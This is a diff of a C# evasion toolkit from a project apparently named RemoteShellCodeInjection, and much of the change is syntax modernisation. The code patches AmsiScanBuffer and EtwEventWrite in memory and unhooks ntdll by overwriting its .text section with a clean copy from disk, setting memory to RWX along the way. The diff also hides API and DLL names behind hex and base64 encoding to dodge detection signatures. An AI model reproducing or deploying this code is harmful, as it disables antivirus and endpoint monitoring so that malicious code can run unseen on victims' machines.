@@ -1,92 +1,86 @@
-﻿using System;
-using System.Runtime;
-using System.Runtime.InteropServices;
-using System.Collections.Generic;
-using System.Collections;
+﻿using RemoteShellCodeInjection.Utils;
 using System.Diagnostics;
-using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
-using System.IO;
-using RemoteShellCodeInjection.Utils;
 
 public class PEReader
 {
     //totally stolen from https://github.com/GetRektBoy724/SharpUnhooker added VERY VERY few adjs to my need.
     public struct IMAGE_DOS_HEADER
     {      // DOS .EXE header
-        public UInt16 e_magic;              // Magic number
-        public UInt16 e_cblp;               // Bytes on last page of file
-        public UInt16 e_cp;                 // Pages in file
-        public UInt16 e_crlc;               // Relocations
-        public UInt16 e_cparhdr;            // Size of header in paragraphs
-        public UInt16 e_minalloc;           // Minimum extra paragraphs needed
-        public UInt16 e_maxalloc;           // Maximum extra paragraphs needed
-        public UInt16 e_ss;                 // Initial (relative) SS value
-        public UInt16 e_sp;                 // Initial SP value
-        public UInt16 e_csum;               // Checksum
-        public UInt16 e_ip;                 // Initial IP value
-        public UInt16 e_cs;                 // Initial (relative) CS value
-        public UInt16 e_lfarlc;             // File address of relocation table
-        public UInt16 e_ovno;               // Overlay number
-        public UInt16 e_res_0;              // Reserved words
-        public UInt16 e_res_1;              // Reserved words
-        public UInt16 e_res_2;              // Reserved words
-        public UInt16 e_res_3;              // Reserved words
-        public UInt16 e_oemid;              // OEM identifier (for e_oeminfo)
-        public UInt16 e_oeminfo;            // OEM information; e_oemid specific
-        public UInt16 e_res2_0;             // Reserved words
-        public UInt16 e_res2_1;             // Reserved words
-        public UInt16 e_res2_2;             // Reserved words
-        public UInt16 e_res2_3;             // Reserved words
-        public UInt16 e_res2_4;             // Reserved words
-        public UInt16 e_res2_5;             // Reserved words
-        public UInt16 e_res2_6;             // Reserved words
-        public UInt16 e_res2_7;             // Reserved words
-        public UInt16 e_res2_8;             // Reserved words
-        public UInt16 e_res2_9;             // Reserved words
-        public UInt32 e_lfanew;             // File address of new exe header
+        public ushort e_magic;              // Magic number
+        public ushort e_cblp;               // Bytes on last page of file
+        public ushort e_cp;                 // Pages in file
+        public ushort e_crlc;               // Relocations
+        public ushort e_cparhdr;            // Size of header in paragraphs
+        public ushort e_minalloc;           // Minimum extra paragraphs needed
+        public ushort e_maxalloc;           // Maximum extra paragraphs needed
+        public ushort e_ss;                 // Initial (relative) SS value
+        public ushort e_sp;                 // Initial SP value
+        public ushort e_csum;               // Checksum
+        public ushort e_ip;                 // Initial IP value
+        public ushort e_cs;                 // Initial (relative) CS value
+        public ushort e_lfarlc;             // File address of relocation table
+        public ushort e_ovno;               // Overlay number
+        public ushort e_res_0;              // Reserved words
+        public ushort e_res_1;              // Reserved words
+        public ushort e_res_2;              // Reserved words
+        public ushort e_res_3;              // Reserved words
+        public ushort e_oemid;              // OEM identifier (for e_oeminfo)
+        public ushort e_oeminfo;            // OEM information; e_oemid specific
+        public ushort e_res2_0;             // Reserved words
+        public ushort e_res2_1;             // Reserved words
+        public ushort e_res2_2;             // Reserved words
+        public ushort e_res2_3;             // Reserved words
+        public ushort e_res2_4;             // Reserved words
+        public ushort e_res2_5;             // Reserved words
+        public ushort e_res2_6;             // Reserved words
+        public ushort e_res2_7;             // Reserved words
+        public ushort e_res2_8;             // Reserved words
+        public ushort e_res2_9;             // Reserved words
+        public uint e_lfanew;             // File address of new exe header
     }
 
     [StructLayout(LayoutKind.Sequential)]
     public struct IMAGE_DATA_DIRECTORY
     {
-        public UInt32 VirtualAddress;
-        public UInt32 Size;
+        public uint VirtualAddress;
+        public uint Size;
     }
 
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct IMAGE_OPTIONAL_HEADER32
     {
-        public UInt16 Magic;
-        public Byte MajorLinkerVersion;
-        public Byte MinorLinkerVersion;
-        public UInt32 SizeOfCode;
-        public UInt32 SizeOfInitializedData;
-        public UInt32 SizeOfUninitializedData;
-        public UInt32 AddressOfEntryPoint;
-        public UInt32 BaseOfCode;
-        public UInt32 BaseOfData;
-        public UInt32 ImageBase;
-        public UInt32 SectionAlignment;
-        public UInt32 FileAlignment;
-        public UInt16 MajorOperatingSystemVersion;
-        public UInt16 MinorOperatingSystemVersion;
-        public UInt16 MajorImageVersion;
-        public UInt16 MinorImageVersion;
-        public UInt16 MajorSubsystemVersion;
-        public UInt16 MinorSubsystemVersion;
-        public UInt32 Win32VersionValue;
-        public UInt32 SizeOfImage;
-        public UInt32 SizeOfHeaders;
-        public UInt32 CheckSum;
-        public UInt16 Subsystem;
-        public UInt16 DllCharacteristics;
-        public UInt32 SizeOfStackReserve;
-        public UInt32 SizeOfStackCommit;
-        public UInt32 SizeOfHeapReserve;
-        public UInt32 SizeOfHeapCommit;
-        public UInt32 LoaderFlags;
-        public UInt32 NumberOfRvaAndSizes;
+        public ushort Magic;
+        public byte MajorLinkerVersion;
+        public byte MinorLinkerVersion;
+        public uint SizeOfCode;
+        public uint SizeOfInitializedData;
+        public uint SizeOfUninitializedData;
+        public uint AddressOfEntryPoint;
+        public uint BaseOfCode;
+        public uint BaseOfData;
+        public uint ImageBase;
+        public uint SectionAlignment;
+        public uint FileAlignment;
+        public ushort MajorOperatingSystemVersion;
+        public ushort MinorOperatingSystemVersion;
+        public ushort MajorImageVersion;
+        public ushort MinorImageVersion;
+        public ushort MajorSubsystemVersion;
+        public ushort MinorSubsystemVersion;
+        public uint Win32VersionValue;
+        public uint SizeOfImage;
+        public uint SizeOfHeaders;
+        public uint CheckSum;
+        public ushort Subsystem;
+        public ushort DllCharacteristics;
+        public uint SizeOfStackReserve;
+        public uint SizeOfStackCommit;
+        public uint SizeOfHeapReserve;
+        public uint SizeOfHeapCommit;
+        public uint LoaderFlags;
+        public uint NumberOfRvaAndSizes;
 
         public IMAGE_DATA_DIRECTORY ExportTable;
         public IMAGE_DATA_DIRECTORY ImportTable;
@@ -109,35 +103,35 @@ public class PEReader
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct IMAGE_OPTIONAL_HEADER64
     {
-        public UInt16 Magic;
-        public Byte MajorLinkerVersion;
-        public Byte MinorLinkerVersion;
-        public UInt32 SizeOfCode;
-        public UInt32 SizeOfInitializedData;
-        public UInt32 SizeOfUninitializedData;
-        public UInt32 AddressOfEntryPoint;
-        public UInt32 BaseOfCode;
-        public UInt64 ImageBase;
-        public UInt32 SectionAlignment;
-        public UInt32 FileAlignment;
-        public UInt16 MajorOperatingSystemVersion;
-        public UInt16 MinorOperatingSystemVersion;
-        public UInt16 MajorImageVersion;
-        public UInt16 MinorImageVersion;
-        public UInt16 MajorSubsystemVersion;
-        public UInt16 MinorSubsystemVersion;
-        public UInt32 Win32VersionValue;
-        public UInt32 SizeOfImage;
-        public UInt32 SizeOfHeaders;
-        public UInt32 CheckSum;
-        public UInt16 Subsystem;
-        public UInt16 DllCharacteristics;
-        public UInt64 SizeOfStackReserve;
-        public UInt64 SizeOfStackCommit;
-        public UInt64 SizeOfHeapReserve;
-        public UInt64 SizeOfHeapCommit;
-        public UInt32 LoaderFlags;
-        public UInt32 NumberOfRvaAndSizes;
+        public ushort Magic;
+        public byte MajorLinkerVersion;
+        public byte MinorLinkerVersion;
+        public uint SizeOfCode;
+        public uint SizeOfInitializedData;
+        public uint SizeOfUninitializedData;
+        public uint AddressOfEntryPoint;
+        public uint BaseOfCode;
+        public ulong ImageBase;
+        public uint SectionAlignment;
+        public uint FileAlignment;
+        public ushort MajorOperatingSystemVersion;
+        public ushort MinorOperatingSystemVersion;
+        public ushort MajorImageVersion;
+        public ushort MinorImageVersion;
+        public ushort MajorSubsystemVersion;
+        public ushort MinorSubsystemVersion;
+        public uint Win32VersionValue;
+        public uint SizeOfImage;
+        public uint SizeOfHeaders;
+        public uint CheckSum;
+        public ushort Subsystem;
+        public ushort DllCharacteristics;
+        public ulong SizeOfStackReserve;
+        public ulong SizeOfStackCommit;
+        public ulong SizeOfHeapReserve;
+        public ulong SizeOfHeapCommit;
+        public uint LoaderFlags;
+        public uint NumberOfRvaAndSizes;
 
         public IMAGE_DATA_DIRECTORY ExportTable;
         public IMAGE_DATA_DIRECTORY ImportTable;
@@ -160,13 +154,13 @@ public class PEReader
     [StructLayout(LayoutKind.Sequential, Pack = 1)]
     public struct IMAGE_FILE_HEADER
     {
-        public UInt16 Machine;
-        public UInt16 NumberOfSections;
-        public UInt32 TimeDateStamp;
-        public UInt32 PointerToSymbolTable;
-        public UInt32 NumberOfSymbols;
-        public UInt16 SizeOfOptionalHeader;
-        public UInt16 Characteristics;
+        public ushort Machine;
+        public ushort NumberOfSections;
+        public uint TimeDateStamp;
+        public uint PointerToSymbolTable;
+        public uint NumberOfSymbols;
+        public ushort SizeOfOptionalHeader;
+        public ushort Characteristics;
     }
 
     [StructLayout(LayoutKind.Explicit)]
@@ -176,21 +170,21 @@ public class PEReader
         [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
         public char[] Name;
         [FieldOffset(8)]
-        public UInt32 VirtualSize;
+        public uint VirtualSize;
         [FieldOffset(12)]
-        public UInt32 VirtualAddress;
+        public uint VirtualAddress;
         [FieldOffset(16)]
-        public UInt32 SizeOfRawData;
+        public uint SizeOfRawData;
         [FieldOffset(20)]
-        public UInt32 PointerToRawData;
+        public uint PointerToRawData;
         [FieldOffset(24)]
-        public UInt32 PointerToRelocations;
+        public uint PointerToRelocations;
         [FieldOffset(28)]
-        public UInt32 PointerToLinenumbers;
+        public uint PointerToLinenumbers;
         [FieldOffset(32)]
-        public UInt16 NumberOfRelocations;
+        public ushort NumberOfRelocations;
         [FieldOffset(34)]
-        public UInt16 NumberOfLinenumbers;
+        public ushort NumberOfLinenumbers;
         [FieldOffset(36)]
         public DataSectionFlags Characteristics;
 
@@ -227,28 +221,21 @@ public class PEReader
 
 
     /// The DOS header
-
     private IMAGE_DOS_HEADER dosHeader;
 
     /// The file header
-
     private IMAGE_FILE_HEADER fileHeader;
 
     /// Optional 32 bit file header 
-
     private IMAGE_OPTIONAL_HEADER32 optionalHeader32;
 
     /// Optional 64 bit file header 
-
     private IMAGE_OPTIONAL_HEADER64 optionalHeader64;
 
     /// Image Section headers. Number of sections is in the file header.
+    private readonly IMAGE_SECTION_HEADER[] imageSectionHeaders;
 
-    private IMAGE_SECTION_HEADER[] imageSectionHeaders;
-
-    private byte[] rawbytes;
-
-
+    private readonly byte[] rawbytes;
 
     public PEReader(string filePath)
     {
@@ -261,9 +248,9 @@ public class PEReader
             // Add 4 bytes to the offset
             stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
 
-            UInt32 ntHeadersSignature = reader.ReadUInt32();
+            uint ntHeadersSignature = reader.ReadUInt32();
             fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
-            if (this.Is32BitHeader)
+            if (Is32BitHeader)
             {
                 optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
             }
@@ -282,7 +269,6 @@ public class PEReader
 
         }
     }
-
     public PEReader(byte[] fileBytes)
     {
         // Read in the DLL or EXE and get the timestamp
@@ -294,9 +280,9 @@ public class PEReader
             // Add 4 bytes to the offset
             stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);
 
-            UInt32 ntHeadersSignature = reader.ReadUInt32();
+            uint ntHeadersSignature = reader.ReadUInt32();
             fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);
-            if (this.Is32BitHeader)
+            if (Is32BitHeader)
             {
                 optionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
             }
@@ -315,8 +301,6 @@ public class PEReader
 
         }
     }
-
-
     public static T FromBinaryReader<T>(BinaryReader reader)
     {
         // Read in a byte array
@@ -333,71 +317,30 @@ public class PEReader
     {
         get
         {
-            UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
+            ushort IMAGE_FILE_32BIT_MACHINE = 0x0100;
             return (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;
         }
     }
-
-
-    public IMAGE_FILE_HEADER FileHeader
-    {
-        get
-        {
-            return fileHeader;
-        }
-    }
-
+    public IMAGE_FILE_HEADER FileHeader => fileHeader;
 
     /// Gets the optional header
-
-    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32
-    {
-        get
-        {
-            return optionalHeader32;
-        }
-    }
-
-
+    public IMAGE_OPTIONAL_HEADER32 OptionalHeader32 => optionalHeader32;
     /// Gets the optional header
-
-    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64
-    {
-        get
-        {
-            return optionalHeader64;
-        }
-    }
-
-    public IMAGE_SECTION_HEADER[] ImageSectionHeaders
-    {
-        get
-        {
-            return imageSectionHeaders;
-        }
-    }
-
-    public byte[] RawBytes
-    {
-        get
-        {
-            return rawbytes;
-        }
-
-    }
-
+    public IMAGE_OPTIONAL_HEADER64 OptionalHeader64 => optionalHeader64;
+    public IMAGE_SECTION_HEADER[] ImageSectionHeaders => imageSectionHeaders;
+    public byte[] RawBytes => rawbytes;
 }
 
 public class Dynavoke
 {
     // Delegate NtProtectVirtualMemory
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-    public delegate UInt32 NtProtectVirtualMemoryDelegate(
+    public delegate uint NtProtectVirtualMemoryDelegate(
         IntPtr ProcessHandle,
         ref IntPtr BaseAddress,
         ref IntPtr RegionSize,
-        UInt32 NewProtect,
-        ref UInt32 OldProtect);
+        uint NewProtect,
+        ref uint OldProtect);
 
     public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
     {
@@ -405,11 +348,11 @@ public class Dynavoke
         try
         {
             // Traverse the PE header in memory
-            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
-            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
-            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
-            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
-            Int64 pExport = 0;
+            int PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+            short OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+            long OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+            short Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+            long pExport = 0;
             if (Magic == 0x010b)
             {
                 pExport = OptHeader + 0x60;
@@ -420,23 +363,24 @@ public class Dynavoke
             }
 
             // Read -> IMAGE_EXPORT_DIRECTORY
-            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
-            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
-            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
-            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
-            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
-            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
-            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+            int ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+            int OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+            int NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+            int NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+            int FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+            int NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+            int OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
 
             // Loop the array of export name RVA's
             for (int i = 0; i < NumberOfNames; i++)
             {
-                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() +
+                    Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                 if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                 {
-                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
-                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
-                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                    int FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                    int FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                    FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);
                     break;
                 }
             }
@@ -451,31 +395,30 @@ public class Dynavoke
         return FunctionPtr;
     }
 
-    public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect)
+    public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
     {
         // Craft an array for the arguments
         OldProtect = 0;
         object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
 
         // get NtProtectVirtualMemory's pointer
-        IntPtr NTDLLHandleInMemory = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress;
-        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, "NtProtectVirtualMemory");
+        IntPtr NTDLLHandleInMemory = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => Utils.FromHexString("6e74646c6c2e646c6c").Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress;
+        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, Utils.FromHexString("4e7450726f746563745669727475616c4d656d6f7279"));
         // dynamicly invoke NtProtectVirtualMemory
         Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(NtProtectVirtualMemoryDelegate));
-        UInt32 NTSTATUSResult = (UInt32)funcDelegate.DynamicInvoke(funcargs);
+        uint NTSTATUSResult = (uint)funcDelegate.DynamicInvoke(funcargs);
 
         if (NTSTATUSResult != 0x00000000)
         {
             return false;
         }
-        OldProtect = (UInt32)funcargs[4];
+        OldProtect = (uint)funcargs[4];
         return true;
     }
 }
 
 public class PatchAMSIAndETW
 {
-
     // Thx D/Invoke!
     private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
     {
@@ -483,11 +426,11 @@ public class PatchAMSIAndETW
         try
         {
             // Traverse the PE header in memory
-            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
-            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
-            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
-            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
-            Int64 pExport = 0;
+            int PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+            short OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+            long OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+            short Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+            long pExport = 0;
             if (Magic == 0x010b)
             {
                 pExport = OptHeader + 0x60;
@@ -498,13 +441,13 @@ public class PatchAMSIAndETW
             }
 
             // Read -> IMAGE_EXPORT_DIRECTORY
-            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
-            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
-            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
-            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
-            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
-            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
-            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+            int ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+            int OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+            int NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+            int NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+            int FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+            int NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+            int OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
 
             // Loop the array of export name RVA's
             for (int i = 0; i < NumberOfNames; i++)
@@ -512,9 +455,9 @@ public class PatchAMSIAndETW
                 string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                 if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                 {
-                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
-                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
-                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                    int FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                    int FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                    FunctionPtr = (IntPtr)((long)ModuleBase + FunctionRVA);
                     break;
                 }
             }
@@ -534,7 +477,7 @@ public class PatchAMSIAndETW
         try
         {
             IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
-            IntPtr libPtr = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress;
+            IntPtr libPtr = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => Utils.FromHexString("6e74646c6c2e646c6c").Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress;
             byte[] patchbyte = new byte[0];
             if (IntPtr.Size == 4)
             {
@@ -558,10 +501,10 @@ public class PatchAMSIAndETW
             }
             IntPtr funcPtr = GetExportAddress(libPtr, Utils.FromHexString("4574774576656e745772697465"));
             IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
-            UInt32 oldProtect = 0;
+            uint oldProtect = 0;
             Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
             Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
-            UInt32 newProtect = 0;
+            uint newProtect = 0;
             Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
             Console.WriteLine(Encoding.ASCII.GetString(Convert.FromBase64String("WysrK10gRVRXIFNVQ0NFU1NGVUxMWSBQQVRDSEVEIQ==")));
         }
@@ -610,10 +553,10 @@ public class PatchAMSIAndETW
             {
                 IntPtr funcPtr = GetExportAddress(libPtr, Utils.FromHexString("416d73695363616e427566666572"));
                 IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
-                UInt32 oldProtect = 0;
+                uint oldProtect = 0;
                 Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
                 Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
-                UInt32 newProtect = 0;
+                uint newProtect = 0;
                 Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
                 Console.WriteLine(Encoding.ASCII.GetString(Convert.FromBase64String("WysrK10gQU1TSSBTVUNDRVNTRlVMTFkgUEFUQ0hFRCE=")));
             }
@@ -645,7 +588,7 @@ public class SharpUnhooker
     {
         for (int i = 0; i < BlacklistedFunction.Length; i++)
         {
-            if (String.Equals(FuncName, BlacklistedFunction[i], StringComparison.OrdinalIgnoreCase))
+            if (string.Equals(FuncName, BlacklistedFunction[i], StringComparison.OrdinalIgnoreCase))
             {
                 return true;
             }
@@ -682,7 +625,7 @@ public class SharpUnhooker
     public static bool JMPUnhooker(string DLLname)
     {
         // get the file path of the module
-        string ModuleFullPath = String.Empty;
+        string ModuleFullPath = string.Empty;
         try { ModuleFullPath = Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName; } catch { ModuleFullPath = null; }
         if (ModuleFullPath == null)
         {
@@ -696,7 +639,7 @@ public class SharpUnhooker
         int TextSectionNumber = 0;
         for (int i = 0; i < OriginalModule.FileHeader.NumberOfSections; i++)
         {
-            if (String.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase))
+            if (string.Equals(OriginalModule.ImageSectionHeaders[i].Section, ".text", StringComparison.OrdinalIgnoreCase))
             {
                 TextSectionNumber = i;
                 break;
@@ -713,7 +656,7 @@ public class SharpUnhooker
         IntPtr ModuleTextSectionAddress = ModuleBaseAddress + (int)OriginalModule.ImageSectionHeaders[TextSectionNumber].VirtualAddress;
 
         // change memory protection to RWX
-        UInt32 oldProtect = 0;
+        uint oldProtect = 0;
         bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, 0x40, ref oldProtect);
         if (!updateMemoryProtection)
         {
@@ -729,7 +672,7 @@ public class SharpUnhooker
             return false;
         }
         // revert the memory protection
-        UInt32 newProtect = 0;
+        uint newProtect = 0;
         Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref ModuleTextSectionAddress, ref TextSectionSize, oldProtect, ref newProtect);
         // done!
         Console.WriteLine("[+++] {0} IS UNHOOKED!", DLLname.ToUpper());
@@ -749,11 +692,11 @@ public class SharpUnhooker
         byte[] ModuleRawByte = File.ReadAllBytes(ModuleFileName);
 
         // Traverse the PE header in memory
-        Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
-        Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
-        Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
-        Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
-        Int64 pExport = 0;
+        int PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+        short OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+        long OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+        short Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+        long pExport = 0;
         if (Magic == 0x010b)
         {
             pExport = OptHeader + 0x60;
@@ -771,24 +714,24 @@ public class SharpUnhooker
         Marshal.Copy(ModuleRawByte, 0, OriginalModuleBase, SizeOfHeaders);
         for (int i = 0; i < DiskModuleParsed.FileHeader.NumberOfSections; i++)
         {
-            IntPtr pVASectionBase = (IntPtr)((UInt64)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
+            IntPtr pVASectionBase = (IntPtr)((ulong)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
             Marshal.Copy(ModuleRawByte, (int)DiskModuleParsed.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)DiskModuleParsed.ImageSectionHeaders[i].SizeOfRawData);
         }
 
         // Read -> IMAGE_EXPORT_DIRECTORY
-        Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+        int ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
         if (ExportRVA == 0)
         {
             Console.WriteLine("[-] Module doesnt have any exports, skipping...");
             return;
         }
